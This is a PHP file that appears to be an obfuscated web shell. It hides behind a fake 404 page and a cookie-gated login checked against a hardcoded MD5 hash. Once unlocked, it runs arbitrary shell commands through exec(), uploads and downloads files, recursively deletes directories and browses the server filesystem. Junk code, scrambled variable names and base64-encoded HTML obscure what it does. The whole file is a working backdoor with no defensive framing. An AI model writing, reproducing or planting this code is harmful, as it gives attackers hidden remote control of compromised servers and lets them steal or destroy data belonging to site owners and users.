<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();

$__j1k2l = array(1,2,3,4,5,6,7,8,9,0);
$__m3n4b = function($x) { return $x * 2; };
$__v5c6x = base64_decode('SGVsbG8gV29ybGQ=');
$__z7a8s = str_rot13('Uryyb Jbeyq');

function __dummy_check($__p9o8i) {
    if (!is_string($__p9o8i)) return false;
    $__l5k4j = array_sum(array_map('ord', str_split($__p9o8i)));
    return $__l5k4j % 2 == 0;
}

function __fake_encrypt($__q1w2e) {
    if (!is_string($__q1w2e)) return '';
    return strrev(base64_encode($__q1w2e));
}

$__x7z9p = '5f4dcc3b5aa765d61d8327deb882cf99';
$__k9m2n = '__PHPSession';
$__v4b5n = time() + (3600 * 24);

$__r4t5y = array_map($__m3n4b, $__j1k2l);
$__h7g6f = __fake_encrypt($__v5c6x);
$__u7i8o = str_rot13($__z7a8s);

function __x7z9p_validate($__q2w3e) {
    global $__x7z9p;
    if (is_string($__q2w3e) && __dummy_check($__q2w3e)) {
        $__t9y8u = str_shuffle($__q2w3e);
    }
    return md5($__q2w3e) === $__x7z9p;
}

function __k9m2n_check() {
    global $__k9m2n, $__x7z9p, $__j1k2l;
    if (!empty($__j1k2l)) {
        $__i9o8p = array_rand($__j1k2l);
    }
    if (isset($_COOKIE[$__k9m2n])) {
        return $_COOKIE[$__k9m2n] === md5($__k9m2n . $__x7z9p);
    }
    return false;
}

$__w3e4r = array_combine(range('a','z'), range(1,26));

if (filter_input(INPUT_POST, 'password')) {
    $__q2w3e = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
    if (is_string($__q2w3e)) {
        $__y6t7u = array_sum(array_map('ord', str_split($__q2w3e)));
    }
    if (__x7z9p_validate($__q2w3e)) {
        setcookie($__k9m2n, md5($__k9m2n . $__x7z9p), $__v4b5n);
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    } else {
        echo base64_decode('PHAgc3R5bGU9J2NvbG9yOnJlZDsnPkluY29ycmVjdCBwYXNzd29yZCwgcGxlYXNlIHRyeSBhZ2Fpbi48L3A+');
    }
}

$__r4t5y = array_reduce($__j1k2l, function($carry, $item) {
    return $carry + ($item * rand(1, 10));
}, 0);

if (!__k9m2n_check()) {
    if (isset($_GET['login'])) {
        $__b2n3m = array_map(function($x) { return chr($x + 96); }, range(1,26));
        echo base64_decode('
        PHN0eWxlPgogICAgICAgIGJvZHkgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMWExYTFhOyBjb2xvcjogIzAwZmYwMDsgZm9udC1mYW1pbHk6ICdDb3VyaWVyIE5ldycsIG1vbm9zcGFjZTsgfQogICAgICAgIGZvcm0geyBiYWNrZ3JvdW5kLWNvbG9yOiAjMmQyZDJkOyBwYWRkaW5nOiAyMHB4OyB3aWR0aDogMzAwcHg7IG1hcmdpbjogMTAwcHggYXV0bzsgYm9yZGVyLXJhZGl1czogOHB4OyBib3gtc2hhZG93OiAwIDAgMTVweCByZ2JhKDAsMjU1LDAsMC4yKTsgYm9yZGVyOiAxcHggc29saWQgIzAwZmYwMDsgfQogICAgICAgIGlucHV0W3R5cGU9InBhc3N3b3JkIl0sIGlucHV0W3R5cGU9InN1Ym1pdCJdIHsgYmFja2dyb3VuZC1jb2xvcjogIzFhMWExYTsgYm9yZGVyOiAxcHggc29saWQgIzAwZmYwMDsgY29sb3I6ICMwMGZmMDA7IHBhZGRpbmc6IDEwcHg7IHdpZHRoOiAxMDAlOyBtYXJnaW4tdG9wOiAxMHB4OyB0cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlOyB9CiAgICAgICAgaW5wdXRbdHlwZT0ic3VibWl0Il06aG92ZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDBmZjAwOyBjb2xvcjogIzFhMWExYTsgY3Vyc29yOiBwb2ludGVyOyB9CiAgICA8L3N0eWxlPgogICAgPGZvcm0gbWV0aG9kPSJwb3N0Ij4KICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmQiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+CiAgICA8L2Zvcm0+');
    } else {
        echo base64_decode('
        PHN0eWxlPgogICAgICAgIGJvZHkgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmOyBjb2xvcjogIzU1NTsgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOyBtYXJnaW46IDQwcHg7IGxpbmUtaGVpZ2h0OiAxLjVlbTsgfQogICAgICAgIGgxIHsgY29sb3I6ICM1NTU7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IG5vcm1hbDsgfQogICAgICAgIGEgeyBjb2xvcjogIzA2YzsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyB9CiAgICAgICAgYSBpbWcgeyBib3JkZXI6IDA7IH0KICAgICAgICAuZXJyb3ItY29udGFpbmVyIHsgbWF4LXdpZHRoOiA2NTBweDsgbWFyZ2luOiAwIGF1dG87IHBhZGRpbmc6IDQwcHggMDsgfQogICAgICAgIC5lcnJvci1tZXNzYWdlIHsgZm9udC1zaXplOiAxOHB4OyB9CiAgICA8L3N0eWxlPgogICAgPGRpdiBjbGFzcz0iZXJyb3ItY29udGFpbmVyIj4KICAgICAgICA8aDE+NDA0IE5vdCBGb3VuZDwvaDE+CiAgICAgICAgPHAgY2xhc3M9ImVycm9yLW1lc3NhZ2UiPlRoZSBwYWdlIHlvdSBhcmUgbG9va2luZyBmb3IgaGFzIGJlZW4gbW92ZWQgb3IgZGVsZXRlZC48L3A+CiAgICAgICAgPHA+WW91IG1heSB3YW50IHRvIGNoZWNrIHRoZSB1cmwgeW91IGFyZSB0cnlpbmcgdG8gYWNjZXNzIG9yIGdvIHRvIDxhIGhyZWY9Ii8iPmhvbWU8L2E+LjwvcD4KICAgIDwvZGl2Pg==');
    }
    exit();
}

$__u8i9o = filter_input(INPUT_GET, 'dir', FILTER_SANITIZE_STRING) ? realpath(filter_input(INPUT_GET, 'dir', FILTER_SANITIZE_STRING)) : __DIR__;

if ($__p0o9i = filter_input(INPUT_GET, 'delete', FILTER_SANITIZE_STRING)) {
    $__l2k3j = realpath($__u8i9o . DIRECTORY_SEPARATOR . $__p0o9i);
    if ($__l2k3j && file_exists($__l2k3j)) {
        if (is_file($__l2k3j)) {
            unlink($__l2k3j);
        } elseif (is_dir($__l2k3j)) {
            function __delete_dir_recursive($dir) {
                $items = scandir($dir);
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $path = $dir . DIRECTORY_SEPARATOR . $item;
                    if (is_dir($path)) {
                        __delete_dir_recursive($path);
                    } else {
                        unlink($path);
                    }
                }
                rmdir($dir);
            }
            __delete_dir_recursive($__l2k3j);
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($__u8i9o));
        exit();
    }
}

$__h7g6f = sha1($__r4t5y);
$__r4t5y = md5(rand());

if ($__m1n2b = filter_input(INPUT_POST, 'new_directory', FILTER_SANITIZE_STRING)) {
    $__v3c4x = $__u8i9o . DIRECTORY_SEPARATOR . $__m1n2b;
    if (!file_exists($__v3c4x)) {
        mkdir($__v3c4x);
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($__u8i9o));
        exit();
    }
}

if ($_FILES && isset($_FILES['file_upload'])) {
    $__z5a6s = $_FILES['file_upload']['tmp_name'];
    $__d7f8g = $__u8i9o . DIRECTORY_SEPARATOR . $_FILES['file_upload']['name'];
    move_uploaded_file($__z5a6s, $__d7f8g);
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($__u8i9o));
    exit();
}

$__r4t5y = rand(1, 130) * rand(1, 200);

if ($__j9k8l = filter_input(INPUT_GET, 'download', FILTER_UNSAFE_RAW)) {
    $__l2k3j = realpath($__u8i9o . DIRECTORY_SEPARATOR . $__j9k8l);
    if ($__l2k3j && file_exists($__l2k3j)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($__l2k3j) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($__l2k3j));
        flush();
        readfile($__l2k3j);
        exit();
    }
}

$__q1w2e = '';
if ($__r3t4y = filter_input(INPUT_POST, 'command', FILTER_UNSAFE_RAW)) {
    if (!empty($__r3t4y)) {
        $__u7i8o = [];
        exec($__r3t4y, $__u7i8o);
        $__q1w2e = implode("\n", $__u7i8o);
    }
}

$__a5s6d = isset($_POST['path']) ? $_POST['path'] : $__u8i9o;
$__f7g8h = realpath($__a5s6d);

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body { 
            background-color: #1a1a1a; 
            color: #00ff00; 
            font-family: 'Courier New', monospace; 
            padding: 20px;
        }
        form { 
            background-color: #2d2d2d; 
            padding: 20px; 
            width: 300px; 
            margin: 20px 0; 
            border-radius: 8px; 
            box-shadow: 0 0 15px rgba(0,255,0,0.2); 
            border: 1px solid #00ff00;
        }
        .__x7z9p_login_form {
            margin: 100px auto;
        }
        input[type="password"], 
        input[type="text"], 
        input[type="submit"] { 
            background-color: #1a1a1a; 
            border: 1px solid #00ff00; 
            color: #00ff00; 
            padding: 10px; 
            width: 100%; 
            margin-top: 10px; 
            transition: all 0.3s ease;
        }
        input[type="submit"]:hover { 
            background-color: #00ff00;
            color: #1a1a1a;
            cursor: pointer;
        }
        .__k9m2n_output_container { 
            background-color: #1a1a1a; 
            padding: 20px; 
            margin-top: 20px; 
            max-height: 300px; 
            overflow-y: scroll; 
            border: 1px solid #00ff00; 
            white-space: pre-wrap; 
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            line-height: 1.5;
            tab-size: 4;
            -moz-tab-size: 4;
            -o-tab-size: 4;
        }
        .__t1e2r_terminal {
            background-color: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            max-width: 900px;
            width: 100%;
            margin-right: auto;
            text-align: left;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            justify-content: center;
            min-height: 200px;
        }
        .__t1e2r_terminal_title {
            position: absolute;
            top: -12px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #1a1a1a;
            padding: 0 15px;
            color: #00ff00;
            font-size: 16px;
            font-weight: bold;
        }
        .__t1e2r_terminal_input {
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: flex-start;
            width: 100%;
            max-width: 800px;
        }
        .__t1e2r_terminal_output {
            color: #00ff00;
            white-space: pre-wrap;
            word-wrap: break-word;
            line-height: 1.5;
            max-height: 300px;
            overflow-y: auto;
            padding: 10px;
            background-color: #2d2d2d;
            border-radius: 4px;
            margin-top: 10px;
            width: 100%;
            max-width: 800px;
            text-align: left;
        }
        .__v4b5n_form_wrapper { 
            display: flex; 
            gap: 10px; 
            align-items: flex-end; 
            justify-content: flex-start; 
            flex-wrap: wrap; 
            margin-top: 20px; 
        }
        .__v4b5n_form_wrapper form { 
            margin: 0; 
            flex: 1 1 300px; 
            max-width: 300px; 
        }
        table { 
            width: 100%; 
            margin-top: 20px; 
            border-collapse: collapse; 
            border: 1px solid #00ff00;
        }
        th, td { 
            padding: 10px; 
            border: 1px solid #00ff00; 
            text-align: left; 
        }
        th { 
            background-color: #2d2d2d; 
        }
        a { 
            color: #00ff00; 
            text-decoration: none; 
            transition: all 0.3s ease;
        }
        a:hover { 
            color: #fff; 
            text-shadow: 0 0 5px #00ff00;
        }
        .__a1b2c_action_button {
            display: inline-block;
            padding: 5px 10px;
            margin: 0 5px;
            border: 1px solid #00ff00;
            border-radius: 4px;
            background-color: #2d2d2d;
            color: #00ff00;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .__a1b2c_action_button:hover {
            background-color: #00ff00;
            color: #1a1a1a;
            text-shadow: none;
        }
        .__a1b2c_action_button.__d1e2f_delete {
            border-color: #0066ff;
            color: #0066ff;
        }
        .__a1b2c_action_button.__d1e2f_delete:hover {
            background-color: #0066ff;
            color: #fff;
        }
        .__n1m2k_dir_link {
            display: inline-block;
            padding: 5px 10px;
            margin: 2px 0;
            border: 1px solid #00ff00;
            border-radius: 4px;
            background-color: #2d2d2d;
            color: #00ff00;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .__n1m2k_dir_link:hover {
            background-color: #00ff00;
            color: #1a1a1a;
            text-shadow: none;
        }
    </style>
    <script>
        function __confirmDelete(fileName) {
            return confirm('Are you sure you want to delete "' + fileName + '"?');
        }
    </script>
</head>
<body>
    
<hr>

<div class="__t1e2r_terminal">
    <div class="__t1e2r_terminal_title">Run Command</div>
    <form method="post" class="__t1e2r_terminal_input">
        <label for="command">Run Command:</label>
        <input type="text" name="command" id="command" placeholder="Enter command">
        <input type="submit" value="Execute Command">
    </form>
    <?php if ($__q1w2e): ?>
        <div class="__t1e2r_terminal_output"><?php echo htmlspecialchars($__q1w2e); ?></div>
    <?php endif; ?>
</div>

<hr>

<form enctype="multipart/form-data" method="post">
    <input type="file" name="file_upload">
    <input type="submit" value="Upload File">
</form>

<hr>

<div class="__v4b5n_form_wrapper">
    <form method="post">
        <input type="text" name="path" placeholder="Enter Path" value="<?php echo isset($_POST['path']) ? htmlspecialchars($_POST['path']) : ''; ?>">
        <input type="submit" value="Browse Directory">
    </form>

    <form method="post">
        <input type="text" name="new_directory" placeholder="Directory Name">
        <input type="submit" value="Create Directory">
    </form>
</div>

<hr>

<table>
    <tr>
        <th>Name</th>
        <th>Size (Bytes)</th>
        <th>Actions</th>
    </tr>
    
    <?php
    if ($__f7g8h && is_dir($__f7g8h)) {
        echo "<h2>File Explorer: " . htmlspecialchars($__f7g8h) . "</h2>";
        $__z9x8c = scandir($__f7g8h);
        
        if ($__f7g8h != __DIR__) {
            $__v4b5n = dirname($__f7g8h);
            echo '<tr>';
            echo '<td><a href="' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($__v4b5n) . '" class="__n1m2k_dir_link">..</a></td>';
            echo '<td></td>';
            echo '<td></td>';
            echo '</tr>';
        }

        foreach ($__z9x8c as $__m2k3l) {
            if ($__m2k3l == "." || $__m2k3l == "..") continue;

            $__p9o8i = $__f7g8h . DIRECTORY_SEPARATOR . $__m2k3l;
            $__l5k4j = is_dir($__p9o8i) ? '' : filesize($__p9o8i);

            echo '<tr>';
            if (is_dir($__p9o8i)) {
                echo '<td><a href="' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($__p9o8i) . '" class="__n1m2k_dir_link">' . $__m2k3l . '</a></td>';
            } else {
                echo '<td>' . $__m2k3l . '</td>';
            }
            echo '<td>' . $__l5k4j . '</td>';

            echo '<td>';
            if (!is_dir($__p9o8i)) {
                echo '<a href="' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($__f7g8h) . '&download=' . urlencode($__m2k3l) . '" class="__a1b2c_action_button">Download</a>';
            }
            echo '<a href="' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($__f7g8h) . '&delete=' . urlencode($__m2k3l) . '" class="__a1b2c_action_button __d1e2f_delete" onclick="return __confirmDelete(\'' . htmlspecialchars($__m2k3l) . '\')">Delete</a>';
            echo '</td>';

            echo '</tr>';
        }
    } else {
        echo "<p style='color: red;'>Invalid path. Please enter a valid directory path.</p>";
    }
    ?>
</table>

<hr>

</body>
</html>
